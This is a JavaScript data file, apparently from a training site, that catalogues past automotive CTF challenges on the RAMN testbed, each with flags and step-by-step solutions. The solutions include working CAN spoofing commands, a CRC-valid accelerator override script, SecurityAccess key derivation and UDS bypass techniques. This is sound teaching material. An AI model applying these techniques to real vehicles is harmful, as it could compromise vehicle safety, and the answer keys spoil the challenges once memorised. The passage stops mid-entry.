const FLASHER_URL = 'https://leaukojo.github.io/ramn-flasher';

// attachment URL helper
const GH = 'https://github.com/ToyotaInfoTech/RAMN/blob/main/misc/past_CTFs';

const CTF_EVENTS = [
  {
    id: 'Automotive_CTF_Japan_2024',
    name: 'Automotive CTF Japan 2024',
    year: 2024,
    flagFormat: 'bh{...}',
    difficulty: 'Easy — recommended starting point',
    challenges: [
      {
        id: 'japan2024-1',
        title: 'slcan',
        ecu: 'A',
        tags: ['USB'],
        difficulty: 'Easy',
        description: 'The slcan version number of your board has the flag.',
        fullSolution: `## Querying the slcan Version String

ECU A exposes the [slcan protocol](https://www.lawicel.com/can232/can232_v1.pdf) over USB serial.
The \`V\` command returns the firmware version — ECU A embeds the flag directly in that string.

**Connect over the USB-CDC serial port.** Participant write-ups used \`/dev/ttyACM2\` at 500000 baud. Because this is a USB-CDC virtual port, the baud rate is nominal (the device ignores it), so any value works:

\`\`\`python
import serial
s = serial.Serial('/dev/ttyACM2', 500000, timeout=2)
s.write(b'V\r')
print(s.readline())
\`\`\`

The response contains the flag embedded in the version string.`,
        flag: 'bh{N3BUL0US_M4RBLE}',
      },
      {
        id: 'japan2024-2',
        title: 'Takeover',
        ecu: 'A',
        tags: ['CAN'],
        difficulty: 'Easy',
        description: 'Flag will be displayed at the bottom of the screen if brake CAN sensor data is `0xF0x` (last 4 bits ignored), accelerator data is `0xDDx`, steering wheel data is `0xF1x`, engine key data is `0x02`, lighting switch data is `0x01`, and side brake data is `0x00`.\n\nNote: CRCs and counters are ignored for this challenge.',
        fullSolution: `## Spoofing CAN Sensor Values

ECU A renders a dashboard from CAN sensor data. When all sensor values match the required pattern simultaneously, the flag appears on screen.

**Step 1 — Map CAN IDs to sensors**

Use \`cansniffer -c can0\` or RAMN's built-in CAN RX monitor. Physically move each control and observe which CAN ID payload changes:

\`\`\`bash
cansniffer -c can0
\`\`\`

**Step 2 — Required values**

| Sensor          | Required value (last nibble ignored where noted) |
|-----------------|--------------------------------------------------|
| Brake           | 0xF0x                                            |
| Accelerator     | 0xDDx                                            |
| Steering wheel  | 0xF1x                                            |
| Engine key      | 0x02                                             |
| Lighting switch | 0x01                                             |
| Side brake      | 0x00                                             |

**Step 3 — Send spoofed frames**

\`\`\`bash
cansend can0 XXX#F000   # brake = 0xF00
cansend can0 XXX#DD00   # accelerator = 0xDD0
cansend can0 XXX#F100   # steering = 0xF10
cansend can0 XXX#02     # engine key
cansend can0 XXX#01     # lighting
cansend can0 XXX#00     # side brake
\`\`\`

All conditions must be met simultaneously. Loop the sends if needed. The flag appears at the bottom of the screen.`,
        flag: 'bh{EXC3LLENT_BOOTH}',
      },
      {
        id: 'japan2024-3',
        title: 'Override',
        ecu: 'A',
        tags: ['CAN'],
        difficulty: 'Medium',
        description: 'Flag will be displayed at the bottom of the screen if you can force the accelerator to a value higher than `0xFFF` with a valid CAN message.\n\nNote: You must identify the correct CRC type and endian.',
        fullSolution: `## Overflowing the Accelerator Field with a Valid CRC

The CAN frame format for the accelerator message (per participant write-ups from the competition) is:

\`\`\`
Bytes 0–1: accelerator value (big-endian)
Bytes 2–3: counter
Bytes 4–7: CRC32 (little-endian)
\`\`\`

ECU A requires the accelerator value to exceed \`0xFFF\` (i.e., ≥ \`0x1000\`) and the CRC to be valid.

**Step 1 — Identify the accelerator CAN ID**

Sniff CAN traffic while pressing the accelerator pedal:

\`\`\`bash
cansniffer -c can0
\`\`\`

**Step 2 — Craft a frame with accel = 0x1000**

\`\`\`python
import can, struct, binascii

bus = can.interface.Bus(channel='can0', bustype='socketcan')
counter = 0

while True:
    accel = 0x1000
    payload = struct.pack('>HH', accel, counter & 0xFFFF)  # 4 bytes
    crc = binascii.crc32(payload) & 0xFFFFFFFF
    payload += struct.pack('<I', crc)
    msg = can.Message(arbitration_id=0x010, data=payload, is_extended_id=False)
    bus.send(msg)
    counter += 1
\`\`\`

The accelerator CAN ID is \`0x010\` (confirmed by participant write-ups). Send continuously at a fast interval (~1 ms) — the flag appears on screen when ECU A accepts a frame whose accelerator field exceeds \`0xFFF\` with a valid CRC.`,
        flag: 'bh{P4INT_GU1DE}',
      },
      {
        id: 'japan2024-4',
        title: 'ReadDataByIdentifier',
        ecu: 'B',
        tags: ['UDS'],
        difficulty: 'Easy',
        description: 'The ECU holds the flag at one of its Data Identifiers.',
        fullSolution: `## Reading the Flag via UDS ReadDataByIdentifier

ECU B exposes a UDS interface on CAN IDs **0x7E1** (request) / **0x7E9** (response).

**Scan all DIDs:**

\`\`\`bash
caringcaribou uds dump_dids 0x7e1 0x7e9
\`\`\`

The \`dump_dids\` scan enumerates every DID and returns the one holding the flag — you do not need to know the DID in advance. *(The specific DID \`0x4242\` shown below is illustrative and unverified against any public write-up; rely on the scan to find the real one.)* To read a known DID directly:

\`\`\`bash
echo "22 42 42" | isotpsend -s 0x7e1 -d 0x7e9 can0
isotprecv -s 0x7e9 -d 0x7e1 can0
\`\`\`

A positive response begins with \`62\` + the echoed DID, followed by the flag bytes in ASCII.`,
        flag: 'bh{JUMPY_3RR0R}',
      },
      {
        id: 'japan2024-5',
        title: 'SecurityAccess',
        ecu: 'B',
        tags: ['UDS', 'Reverse'],
        difficulty: 'Medium',
        attachments: [
          { name: 'ECUB_security_access.txt', url: `${GH}/Automotive_CTF_Japan_2024/challenge_attachments/ECUB_security_access.txt` },
        ],
        description: 'The ECU holds the flag at Data Identifier `0xFFFF`, but you will need to authenticate first.',
        fullSolution: `## Reversing the SecurityAccess Key Algorithm

The attachment \`ECUB_security_access.txt\` is an ARM32 disassembly excerpt of ECU B's SecurityAccess handler. Participant write-ups from two independent teams at the competition confirmed the key derivation formula:

\`\`\`
key = (seed × 3 + 0x1240) XOR 0xffff
\`\`\`

(In the disassembly: \`seed * 3\` is computed first, then \`0x1220\` is added, then \`0x20\` is added, then the result is XORed with \`0xffff\`.)

\`\`\`mermaid
flowchart LR
  A["Request seed: 27 01"] --> B["ECU: 67 01 + 4-byte seed"]
  B --> C["key = seed * 3"]
  C --> D["+ 0x1220"]
  D --> E["+ 0x20"]
  E --> F["XOR 0xFFFF"]
  F --> G["Send key: 27 02 + 4-byte key"]
  G --> H["67 02 = authenticated"]
\`\`\`

**Step 1 — Request a seed**

\`\`\`bash
echo "27 01" | isotpsend -s 0x7e1 -d 0x7e9 can0
isotprecv -s 0x7e9 -d 0x7e1 can0
# Response: 67 01 SS SS SS SS  (SS = seed bytes, big-endian)
\`\`\`

**Step 2 — Compute and send the key**

\`\`\`python
seed = 0xAABBCCDD  # replace with actual seed from response
key = ((seed * 3 + 0x1240) ^ 0xffff) & 0xffffffff
print(f"Key: {key:08X}")
\`\`\`

\`\`\`bash
echo "27 02 KK KK KK KK" | isotpsend -s 0x7e1 -d 0x7e9 can0
# Response: 67 02  (authenticated)
\`\`\`

**Step 3 — Read the protected DID**

\`\`\`bash
echo "22 FF FF" | isotpsend -s 0x7e1 -d 0x7e9 can0
# Response: 62 FF FF <flag bytes>
\`\`\``,
        flag: 'bh{GU4RDeD_M4ILBoX}',
      },
      {
        id: 'japan2024-6',
        title: 'RAM peak',
        ecu: 'B',
        tags: ['UDS'],
        difficulty: 'Difficult',
        description: 'There is a flag in RAM that can be read with the ReadMemoryByAddress service. Flag length is 17 characters.',
        fullSolution: `## Scanning RAM for the Flag via ReadMemoryByAddress

UDS service **0x23** (ReadMemoryByAddress) can read from the STM32L552 RAM range \`0x20000000\`–\`0x20040000\`. The flag is 17 characters long; its exact address is not documented in any public write-up (this challenge was **unsolved by all teams** at the competition).

**Approach — scan the full RAM range:**

\`\`\`python
import subprocess, time

for offset in range(0, 0x40000, 0x10):
    addr = 0x20000000 + offset
    request = "23 14 {:02X} {:02X} {:02X} {:02X} 11".format(
        (addr >> 24) & 0xFF, (addr >> 16) & 0xFF,
        (addr >> 8) & 0xFF, addr & 0xFF
    )
    # send and check response for 'bh{' (0x62 0x68 0x7B)
\`\`\`

The \`addressAndLengthFormatIdentifier\` byte \`0x14\` = 4-byte address + 1-byte length. Reading 0x11 = 17 bytes per request.

\`\`\`bash
# Manual example: read 17 bytes at a specific address
echo "23 14 20 03 71 F0 11" | isotpsend -s 0x7e1 -d 0x7e9 can0
\`\`\`

When the flag is found, the response begins with \`63\` followed by 17 ASCII bytes starting with \`bh{\`.`,
        flag: 'bh{B34R_FoLLoW3R}',
      },
      {
        id: 'japan2024-7',
        title: 'UDS Backdoor',
        ecu: 'B',
        tags: ['UDS'],
        difficulty: 'Difficult',
        description: 'There is a hidden UDS service, can you format a valid request for it?',
        fullSolution: `## Probing a Custom UDS Service (0x55)

ECU B implements a non-standard UDS service with ID \`0x55\`. Standard scanning tools won't enumerate it — probe it directly using negative response codes (NRCs) to guide discovery.

**NRC reference:**

| NRC  | Meaning                         |
|------|---------------------------------|
| 0x11 | ServiceNotSupported             |
| 0x12 | SubFunctionNotSupported         |
| 0x13 | IncorrectMessageLengthOrFormat  |
| 0x22 | ConditionsNotCorrect            |
| 0x31 | RequestOutOfRange               |

**Step 1 — Confirm service exists**

\`\`\`bash
echo "55" | isotpsend -s 0x7e1 -d 0x7e9 can0
# NRC 0x12 → service exists, needs subfunction
\`\`\`

**Step 2 — Enumerate subfunction bytes**

\`\`\`bash
for sf in $(seq 0 255); do
  printf "55 %02x\n" $sf | isotpsend -s 0x7e1 -d 0x7e9 can0
  # Watch for NRC shift from 0x12 to 0x31 → valid subfunction found
done
\`\`\`

Participant write-ups recovered the valid subfunction: **\`0x1A\`**. The request is a 3-byte frame \`55 1A <param>\`, and the default rejection is \`7F 55 12\` (subFunctionNotSupported) until the subfunction is correct.

**Step 3 — Enumerate the parameter byte**

With subfunction \`0x1A\` fixed, sweep the final \`<param>\` byte:

\`\`\`bash
for p in $(seq 0 255); do
  printf "55 1A %02x\n" $p | isotpsend -s 0x7e1 -d 0x7e9 can0
  # NRC 0x31 (RequestOutOfRange) = wrong param; positive 0x95 = correct
done
\`\`\`

A positive response (\`0x95\` = 0x55 + 0x40) contains the flag.`,
        flag: 'bh{P0CK3T_POCKeT}',
      },
      {
        id: 'japan2024-8',
        title: 'Secret code',
        ecu: 'C',
        tags: ['CAN', 'Reverse'],
        difficulty: 'Medium',
        attachments: [
          { name: 'ECUC_secret_message.txt', url: `${GH}/Automotive_CTF_Japan_2024/challenge_attachments/ECUC_secret_message.txt` },
        ],
        description: 'ECU C is waiting for a secret CAN message.\n\nNote: Pay attention to endianness.',
        fullSolution: `## Sending the Secret CAN Trigger Message

ECU C's receive handler waits for a specific CAN frame. The attached disassembly (\`ECUC_secret_message.txt\`) shows the comparison: two 32-bit little-endian words at offsets 0 and 4.

Per participant write-ups: the expected 8-byte payload is the ASCII string **\`PLS_MR_!\`**:

\`\`\`
Hex: 50 4C 53 5F 4D 52 5F 21
\`\`\`

**Send the trigger frame:**

\`\`\`bash
cansend can0 5AA#504C535F4D525F21
\`\`\`

Once ECU C accepts the frame, **the flag is displayed on the RAMN screen** (confirmed by participant write-up). Send the trigger repeatedly if it doesn't register the first time.

*(An earlier draft of this solution claimed the flag is returned on CAN ID \`0x777\`; no write-up supports that — the flag appears on the screen.)*`,
        flag: 'bh{R1TzY_CONDuCT}',
      },
      {
        id: 'japan2024-9',
        title: 'Noiseless',
        ecu: 'C',
        tags: ['CAN', 'Steganography'],
        difficulty: 'Difficult',
        description: 'The least significant bit of the brake message is not noise.\n\nNote: the flag is an ASCII string that starts with `bh{`.\nNote: A 1-minute CAN log has all you need to retrieve the flag.',
        fullSolution: `## LSB Steganography in Brake Sensor Frames

*(Confirmed by participant write-up from the competition.)*

ECU C encodes the flag in the **least significant bit** of the brake sensor value in each periodic CAN frame. The brake frame CAN ID is **\`0x007\`**.

**Step 1 — Capture ~1 minute of CAN traffic**

\`\`\`bash
candump -l can0 &
sleep 60
kill %1
\`\`\`

**Step 2 — Extract LSBs and decode**

The brake sensor value sits in byte index 2 of the payload (participant write-ups describe it as "the 2nd byte" — confirm whether that means payload index 1 or 2 on your own capture). Its LSB is the steganographic bit:
- \`0x80\` → 0
- \`0x81\` → 1
- \`0x82\` → 0
- \`0x83\` → 1

\`\`\`python
import re

bits = []
with open("candump.log") as f:
    for line in f:
        if " 007 " in line or "#" in line and "007#" in line:
            m = re.search(r'007#([0-9A-Fa-f]+)', line)
            if not m:
                m = re.search(r'\[8\]\s+([0-9A-F ]+)', line)
            if m:
                payload = bytes.fromhex(m.group(1).replace(' ', ''))
                bits.append(payload[2] & 0x01)  # byte 2 LSB

flag = ''
for i in range(0, len(bits) - 7, 8):
    byte = int(''.join(str(b) for b in bits[i:i+8]), 2)
    flag += chr(byte)
    if '}' in flag:
        break
print(flag)
\`\`\``,
        flag: 'bh{J0KE_PIquANT}',
      },
      {
        id: 'japan2024-10',
        title: 'Where?',
        ecu: 'C',
        tags: ['CAN', 'Steganography'],
        difficulty: 'Difficult',
        description: 'There is a flag hidden in the timing of the message with CAN ID `0x0AB`.\n\nNote: the flag is an ASCII string that starts with `bh{`.\nNote: A 1-minute CAN log has all you need to retrieve the flag.',
        fullSolution: `## Timing Steganography on CAN ID 0x0AB

*(Confirmed by participant write-ups from the competition.)*

CAN ID \`0x0AB\` is normally periodic. The flag is encoded in the **gap between consecutive frames**: per the participant write-up, a long gap (≈0.1 s) is a \`1\` bit and a short/normal gap is a \`0\` bit. Decode by measuring inter-arrival times and thresholding them into two clusters.

**Step 1 — Capture a 1-minute log**

\`\`\`bash
candump -l can0 &
sleep 60
kill %1
\`\`\`

**Step 2 — Measure inter-frame gaps and threshold into bits**

\`\`\`python
timestamps = []
with open("candump.log") as f:
    for line in f:
        if " 0AB " in line or "0AB#" in line:
            t = float(line.split('(')[1].split(')')[0])
            timestamps.append(t)

gaps = [timestamps[i+1] - timestamps[i] for i in range(len(timestamps) - 1)]

# Two clusters: the larger gaps are '1', the baseline-period gaps are '0'.
# A midpoint between the smallest and largest gap is a reasonable first
# threshold; inspect a histogram of \`gaps\` and adjust if the decode is wrong.
threshold = (min(gaps) + max(gaps)) / 2
bits = [1 if g > threshold else 0 for g in gaps]

flag = ''
for i in range(0, len(bits) - 7, 8):
    byte = int(''.join(str(b) for b in bits[i:i+8]), 2)
    flag += chr(byte)
    if '}' in flag:
        break
print(flag)
\`\`\`

If the result is garbled, plot a histogram of \`gaps\`: the two timing clusters (short ≈ the base period, long ≈ +0.1 s) should be clearly separated, and you can set the threshold between them.`,
        flag: 'bh{FL3E_Flees_g4TE}',
      },
      {
        id: 'japan2024-11',
        title: 'UART',
        ecu: 'D',
        tags: ['Hardware'],
        difficulty: 'Easy',
        description: "This flag is broadcasted on ECU D's LPUART1 interface at 115200 bps.\n\nNote: UART adapter required.",
        fullSolution: `## Reading the Flag from ECU D's LPUART1

ECU D broadcasts the flag continuously over LPUART1 at **115200 baud** (8N1). The TX pin is on the ECU D expansion port.

**Finding the correct pin:**

Per participant write-up: use a "hardware brute-force" approach — connect only GND, then try each pin on the expansion socket one at a time with a USB-UART adapter and a terminal until output appears. The correct pin is **PA2**.

Alternatively, check the [RAMN expansion port pinout](https://ramn.readthedocs.io/en/latest/hardware/expansions.html) for LPUART1 TX (PA2).

**Wiring:**

\`\`\`
ECU D expansion port    USB-UART adapter
PA2 (LPUART1 TX)  →    RX
GND               ——    GND
\`\`\`

**Open the port:**

\`\`\`bash
screen /dev/ttyUSB0 115200
# or
minicom -D /dev/ttyUSB0 -b 115200
\`\`\`

The flag streams continuously on connection.`,
        flag: 'bh{DIGEST_SHOUT}',
      },
      {
        id: 'japan2024-12',
        title: 'JTAG',
        ecu: 'D',
        tags: ['Hardware'],
        difficulty: 'Difficult',
        description: "One flag can be read on ECU D's RAM from the JTAG interface.\n\nNote: JTAG adapter required.",
        fullSolution: `## Reading a Flag from RAM via JTAG

*(Confirmed by participant write-up from the competition.)*

ECU D's expansion port exposes JTAG pins. The flag is in RAM near address **\`0x2000a020\`**.

**Wiring (C232HM cable or equivalent):**

| Signal | JTAG pin | ECU D expansion pin |
|--------|----------|---------------------|
| TCK    | —        | Pin 24              |
| TDI    | —        | Pin 23              |
| TDO    | —        | Pin 25              |
| TMS    | —        | Pin 22              |
| TRST   | —        | Pin 26              |
| GND    | —        | Pin 4               |

**OpenOCD connection:**

\`\`\`bash
openocd -f interface/cmsis-dap.cfg -f target/stm32l5x.cfg
# In another terminal:
telnet localhost 4444
\`\`\`

**Dump RAM and find the flag:**

\`\`\`
> halt
> mdw 0x20000000 0x1000
\`\`\`

The flag appears at offset \`0x0a020\` from \`0x20000000\` (= \`0x2000a020\`). Data is shown as 32-bit little-endian words — convert to ASCII:

\`\`\`python
import struct

# Paste the 32-bit words OpenOCD's \`mdw\` prints for the flag region, e.g.
#   0x2000a020: 7b68627b 4c544f50 ...
# \`mdw\` prints each word as a value; the bytes are little-endian in memory,
# so re-pack each word little-endian and concatenate to recover the ASCII.
words = [0x7b68627b, 0x4c544f50]   # replace with the actual dump
flag = b''.join(struct.pack('<I', w) for w in words)
print(flag.decode('ascii', errors='replace'))
\`\`\``,
        flag: 'bh{SPOTLESS_SCRAWL}',
      },
    ],
  },
  {
    id: 'Automotive_CTF_2024',
    name: 'Automotive CTF 2024',
    year: 2024,
    flagFormat: 'bh{...}',
    difficulty: 'Medium',
    challenges: [
      {
        id: 'auto2024-1',
        title: 'SWD 1',
        ecu: 'FILE',
        tags: ['Forensics'],
        difficulty: 'Easy',
        attachments: [
          { name: 'swd.csv', url: `${GH}/Automotive_CTF_2024/challenge_attachments/swd.csv` },
        ],
        description: 'The attached file (`swd.csv`) is a logic analyzer capture of a RAMN ECU programming session using an ST-LINK V2. Can you figure out the flag embedded in plaintext?',
        fullSolution: `## Decoding an SWD Logic Analyzer Capture

SWD (Serial Wire Debug) is the 2-wire debug protocol used to program STM32 microcontrollers. The capture shows an ST-LINK V2 writing firmware to flash. The firmware contains the flag in plaintext — you just need to decode the SWD protocol and search for it.

**Step 1 — Import the CSV into PulseView (or sigrok)**

Open PulseView → File → Import CSV. The CSV has this format:

\`\`\`
Time;CH 1 SWCLK;CH 2 SWDIO
0.000000000;1;1
0.594872000;0;1
...
\`\`\`

In the import dialog, set the separator to \`;\` and map:
- Column 1 → SWCLK channel
- Column 2 → SWDIO channel

**Step 2 — Add the SWD protocol decoder**

In PulseView: Decoders → Add → SWD. Assign SWCLK and SWDIO. The decoder will annotate the trace with ARM Debug Port (DP) and Access Port (AP) transactions showing what the ST-LINK is reading and writing.

**Step 3 — Export and search for the flag**

Export the decoded annotations to text (File → Export annotations). Then search for the flag prefix \`bh{\` — in hex, that's \`62 68 7B\`. Because data is written in 32-bit little-endian words, the bytes appear in reversed order as \`7B 68 62\`:

\`\`\`bash
grep -i "7b6862" decoded_swd.txt
\`\`\`

The flag \`bh{an4lyst_s3ssION_Ro4d}\` appears in the data payload of an AP write transaction (AP register C = DRW, the Data Read/Write register).`,
        flag: 'bh{an4lyst_s3ssION_Ro4d}',
      },
      {
        id: 'auto2024-2',
        title: 'SWD 2',
        ecu: 'FILE',
        tags: ['Forensics', 'Reverse'],
        difficulty: 'Very Difficult',
        description: 'The firmware of challenge "SWD 1" broadcasts every second two flags in plaintext over CAN, using the same function. CAN ID `0x12345678` is used to broadcast the flag of SWD 1. The flag of this challenge is the one transmitted with ID `0x7777`.\n\n(Note: Flash starts at `0x08000000`, RAM at `0x20000000`. `Reset_Handler()` is at `0x08001570`.)',
        fullSolution: `## Extracting and Reversing the Firmware from SWD Captures

The SWD capture from SWD 1 contains the full firmware being flashed. This challenge requires you to reconstruct that binary and reverse engineer an obfuscated flag.

\`\`\`mermaid
flowchart TD
  A["SWD capture (from SWD 1)"] --> B["Parse: W AP4 = address, W APc = 32-bit LE data"]
  B --> C["Reconstruct firmware.bin at base 0x08000000"]
  C --> D["Load in Ghidra (ARM Cortex-M, entry 0x08001570)"]
  D --> E["Find CAN broadcast fn via constant 0x12345678"]
  E --> F["Find deobfuscation routine (writes RAM 0x20030020)"]
  F --> G["flag[i] = (obf[i] XOR key) - key"]
\`\`\`

**Step 1 — Reconstruct the firmware binary**

From the SWD decoded output, two AP transactions are key:
- **W AP4** (write to TAR — Transfer Address Register): sets the target write address
- **W APc** (write to DRW — Data Read/Write register): writes 32-bit data to that address

Write a script to extract all address+data pairs and reconstruct the binary:

\`\`\`python
import re, struct

firmware = bytearray(0x40000)  # 256 KB (flash size)
FLASH_BASE = 0x08000000

tar = 0
with open("decoded_swd.txt") as f:
    for line in f:
        if "W AP4" in line:
            m = re.search(r'0x([0-9a-fA-F]+)', line)
            if m:
                tar = int(m.group(1), 16)
        elif "W APc" in line:
            m = re.search(r'0x([0-9a-fA-F]+)', line)
            if m and FLASH_BASE <= tar < FLASH_BASE + 0x40000:
                offset = tar - FLASH_BASE
                data = int(m.group(1), 16)
                firmware[offset:offset+4] = struct.pack('<I', data)
                tar += 4

with open("firmware.bin", "wb") as f:
    f.write(firmware)
\`\`\`

**Step 2 — Load in Ghidra**

- File → Import → Raw Binary
- Language: ARM Cortex-M, 32-bit LE (ARM:LE:32:v8)
- Base address: \`0x08000000\`
- Entry point: \`0x08001570\` (given in the prompt)
- Let auto-analysis run

**Step 3 — Find the CAN broadcast function**

Search for the constant \`0x12345678\` (CAN ID used for the SWD1 flag). Ghidra will find it in a function that calls a CAN transmit routine twice — once for ID \`0x12345678\` and once for \`0x7777\`. The second call passes a pointer to the second flag's RAM location (\`0x20030020\`).

**Step 4 — Find the deobfuscation routine**

The only other cross-reference to \`0x20030020\` is the function that populates it. It applies XOR and subtraction using a repeating key:

\`\`\`c
// Key: "dw\\x01ss1"
flag[i] = (obfuscated[i] ^ key[i % KEYLEN]) - key[i % KEYLEN];
\`\`\`

*(The key string \`dw\\x01ss1\` is 6 bytes as written, so \`KEYLEN = 6\`. The official write-up's prose calls it "5 bytes" / \`% 5\`, which appears to be a miscount — verify against the disassembly if your decode comes out shifted by a character.)*

The obfuscated flag is in the \`.data\` section of flash (starting around \`0x0800ab94\`, loaded into RAM at \`0x20037750\` on startup). Extract those bytes from your firmware binary and apply the deobfuscation:

\`\`\`python
key = b"dw\\x01ss1"
obfuscated = firmware[0x0800ab94 - 0x08000000: 0x0800ab94 - 0x08000000 + 30]
flag = bytes([(b ^ key[i % 6]) - key[i % 6] for i, b in enumerate(obfuscated)])
print(flag.decode('ascii', errors='replace'))
\`\`\``,
        flag: 'bh{pr0duct_AMB1tion}',
      },
      {
        id: 'auto2024-3',
        title: "slcan't",
        ecu: 'A',
        tags: ['USB', 'CAN'],
        difficulty: 'Medium',
        description: "Why does `ramn_utils.c` need such a large `ascii_hashmap`? We could use all those unused bytes to store a flag instead…\n\n(Note: This challenge is easier to solve with an external CAN adapter.)",
        fullSolution: `## Dumping the ascii_hashmap via slcan

The \`ascii_hashmap[]\` table in RAMN's source is a 256-byte lookup table used to convert ASCII hex characters to their numeric values. Most of the 256 entries are \`0x00\` — only the ~20 entries for \`0–9\`, \`A–F\`, \`a–f\` are non-zero. The unused zero-bytes have been replaced with the flag.

**How the slcan \`t\` command exposes the table**

The slcan transmit command format is: \`t<ID><DLC><DATA>\\r\`

The firmware uses \`ASCIItoUint8()\` to parse the \`<DATA>\` hex bytes:
\`\`\`c
return (ascii_hashmap[src[0]] << 4) + ascii_hashmap[src[1]];
\`\`\`

This means the transmitted CAN payload byte equals \`ascii_hashmap[src[0]] << 4 | ascii_hashmap[src[1]]\`. By sending a 1-byte (DLC=1) transmit command with a single raw byte as the data index, you force ECU A to look up that byte in the table and transmit \`ascii_hashmap[index]\` over CAN.

**Step 1 — Connect to ECU A and set up a CAN listener**

\`\`\`python
import serial
ser = serial.Serial('/dev/ttyACM0', 115200, timeout=0.1)
ser.write(b'O\\r')  # open the CAN channel (slcan command)
\`\`\`

On an external CAN adapter (PCAN, SocketCAN, etc.):
\`\`\`bash
python -m can.logger -i pcan -c PCAN_USBBUS1 --filter 0x002:0x7FF -o dump.asc
\`\`\`

**Step 2 — Iterate through all 256 table entries**

\`\`\`python
for i in range(0x100):
    # Command: transmit 1 byte with CAN ID 0x002, using table index i
    cmd = b't00210' + bytes([i]) + b'\\r'
    ser.write(cmd)
    time.sleep(0.01)
\`\`\`

**Step 3 — Read the flag from the CAN log**

After all 256 iterations, read the captured CAN frames. The bytes at indices where the table was populated with flag characters (instead of 0x00) form the flag string \`bh{B4RK_B0RK_bOrK}\`.`,
        flag: 'bh{B4RK_B0RK_bOrK}',
      },
      {
        id: 'auto2024-4',
        title: 'Ramen Clicker',
        ecu: 'A/C',
        tags: ['CAN', 'Hardware'],
        difficulty: 'Medium/Difficult',
        description: 'My high score is `0x9000`.\n\n(Note: The SHIFT joystick on the powertrain expansion can be center-pressed. You should use an external CAN adapter.)',
        fullSolution: `## Bypassing the Ramen Clicker Anti-Cheat

ECU A displays a clicker game counting center-presses of the SHIFT joystick. ECU C reads the joystick hardware and sends CAN messages to ECU A. The flag appears when the score exceeds \`0x9000\` (36,864 clicks).

**Why you can't just spoof CAN ID 0x045:**

ECU A has an anti-cheat system:
1. If it doesn't receive a message with CAN ID \`0x045\` for more than 500 ms, it shows a cheat screen and resets the counter.
2. When ECU C itself receives a message with ID \`0x045\` (from the spoofed traffic), it sends ID \`0x001\` to warn ECU A, which also triggers anti-cheat.

**The solution: remove ECU C from the bus first**

ECU C normally transmits ID \`0x045\`. If ECU C is in reset, it can't send the anti-cheat warning. Remove ECU C cleanly before starting to spoof:

**Option A — Short the reset pin on ECU C's expansion port:**
- Pin 21 = NRST, Pin 4 = GND on ECU C's expansion connector
- Connecting these holds ECU C in reset

**Option B — Use the USB serial interface to shut down ECU C:**
- ECU A controls power to ECU B/C/D — find the USB command that disables ECU C's supply

**Immediately after ECU C goes silent, start spoofing:**

\`\`\`bash
# joystick center-pressed: CAN ID 045, byte 1 = gear state, byte 2 = 0x06 (pressed)
# joystick released:        CAN ID 045, byte 2 = 0x01
timeout 1000s bash -c 'while true; do
  cansend can0 045#0106
  cansend can0 045#0101
done'
\`\`\`

After ~36,864 press/release cycles the flag appears on ECU A's screen.`,
        flag: 'bh{N1NN1KUM4SHIMA5HI}',
      },
      {
        id: 'auto2024-5',
        title: 'Rush Hour',
        ecu: 'B',
        tags: ['UDS'],
        difficulty: 'Medium',
        attachments: [
          { name: 'ECUB.elf', url: `${GH}/Automotive_CTF_2024/challenge_attachments/ECUB.elf` },
        ],
        description: 'We added a UDS disable feature to ECU B to prevent you from reading the flag.\n\nNote: The attached `ECUB.elf` has the flag redacted.',
        fullSolution: `## Racing the UDS Disable Timer

The \`ECUB.elf\` attachment includes full debug symbols, making Ghidra analysis straightforward. Load it as ARM Cortex-M, 32-bit LE — the ELF format auto-populates the memory map.

**What the firmware does at boot:**

1. Initializes hardware peripherals
2. **Activates the CAN peripheral** — ECU B starts accepting CAN frames
3. Waits approximately **10 milliseconds**
4. Sets a global variable \`UDS_ENABLE = 0\` — all UDS requests are now ignored

**Finding the flag:**

In Ghidra, search Defined Strings for "flag" or look for ReadDataByIdentifier handler code. DID \`0x0001\` returns the flag — but only when \`UDS_ENABLE == 1\`.

**The exploit:**

There is a ~10 ms window between steps 2 and 4. If a UDS ReadDataByIdentifier request arrives during that window, \`UDS_ENABLE\` is still 1 and the flag is returned.

**How to exploit it:**

Trigger a reset of ECU B (short its reset pin briefly, or use ECU A's power control command), then immediately flood it with RDBI requests:

\`\`\`bash
# Reset ECU B, then immediately start spamming
while true; do
  echo "22 00 01" | isotpsend -s 0x7e1 -d 0x7e9 can0
  isotprecv -s 0x7e9 -d 0x7e1 can0 -t 50  # 50ms timeout
done
\`\`\`

When the timing aligns, ECU B processes one of the requests while UDS is still enabled and responds with the flag.

\`\`\`mermaid
sequenceDiagram
  participant Atk as Attacker
  participant B as ECU B
  Note over B: t=0 power on, init
  Note over B: t~X CAN peripheral active
  Atk->>B: 22 00 01 (RDBI) flooded
  Note over B: window open, UDS_ENABLE = 1
  B-->>Atk: 62 00 01 + flag (if request lands in window)
  Note over B: t~X+10ms UDS_ENABLE = 0, window closed
\`\`\`

\`\`\`
Timeline:
t=0ms    ECU B powers on, begins initialization
t=Xms    CAN peripheral active ← your requests start being received HERE
t=X+10ms UDS_ENABLE set to 0  ← window closes
\`\`\``,
        flag: 'bh{Sl0W_Down_Every0ne}',
      },
      {
        id: 'auto2024-6',
        title: 'CVE-2017-14937',
        ecu: 'C',
        tags: ['UDS'],
        difficulty: 'Easy',
        description: 'Go write something at `0x1111` and read something at `0x0000`.',
        fullSolution: `## Exploiting CVE-2017-14937

The challenge name references **CVE-2017-14937** as flavor. The exact public details of that CVE aren't needed here (and our characterization of it is unverified) — what matters is the behavior ECU C reproduces: writing to DID \`0x1111\` via the UDS \`WriteDataByIdentifier\` service unlocks reading of DID \`0x0000\`, which contains the flag, with no SecurityAccess authentication required.

ECU C's CAN IDs: request **0x7E2**, response **0x7EA**.

**Step 1 — (Optional) Authenticate with SecurityAccess**

The CVE describes how SecurityAccess can be bypassed in affected implementations. Depending on ECU C's exact implementation, you may need to perform (or bypass) SecurityAccess first. Try the write step directly first.

**Step 2 — Write to DID 0x1111**

\`\`\`bash
# Service 0x2E = WriteDataByIdentifier
# DID 0x1111, data = one byte (0x00)
echo "2E 11 11 00" | isotpsend -s 0x7e2 -d 0x7ea can0
\`\`\`

A positive response (\`6E 11 11\`) means the write succeeded.

**Step 3 — Read the flag from DID 0x0000**

\`\`\`bash
echo "22 00 00" | isotpsend -s 0x7e2 -d 0x7ea can0
isotprecv -s 0x7ea -d 0x7e2 can0
\`\`\`

The response begins with \`62 00 00\` followed by the flag bytes in ASCII.`,
        flag: 'bh{SUP3RS0NIc}',
      },
      {
        id: 'auto2024-7',
        title: 'DID not done',
        ecu: 'C',
        tags: ['UDS'],
        difficulty: 'Medium/Difficult',
